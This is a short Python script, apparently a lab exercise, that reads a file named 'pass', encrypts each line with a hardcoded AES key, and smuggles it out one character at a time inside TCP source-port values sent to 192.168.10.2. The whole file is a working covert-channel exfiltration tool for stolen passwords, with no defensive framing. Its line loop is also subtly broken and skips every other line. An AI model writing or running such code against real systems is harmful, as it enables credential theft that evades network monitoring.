#!/usr/bin/python -Btt

import sys
from Crypto.Cipher import AES
from Crypto import Random
from base64 import b64encode
from time import sleep
from scapy.all import *

def encrypt(key, clear):
	BLOCK_SIZE = 32
	PADDING = '/'
	pad = lambda s: s + (BLOCK_SIZE - len(s) % BLOCK_SIZE) * PADDING
	EncodeAES = lambda c, s: b64encode(c.encrypt(pad(s)))
	cipher = AES.new(key)
	msg = EncodeAES(cipher, clear)
	return msg

def send_msg(msg):
	packet = IP(dst='192.168.10.2')
	segment = TCP(dport=80, flags=0x02)
	print msg
	for c in msg:
		segment = TCP(sport=ord(c) + 10000)
		send(packet/segment)
		sleep(1)
	segment = TCP(sport=30000)
	send(packet/segment)

def main(argv):
	key = ':Yjds52%9wnsjp>)'
	f = open('pass', 'r')
	for line in f:
		clear = f.readline()
		msg = encrypt(key, clear)
		send_msg(msg)
	f.close()

if __name__ == '__main__':
	main(sys.argv)
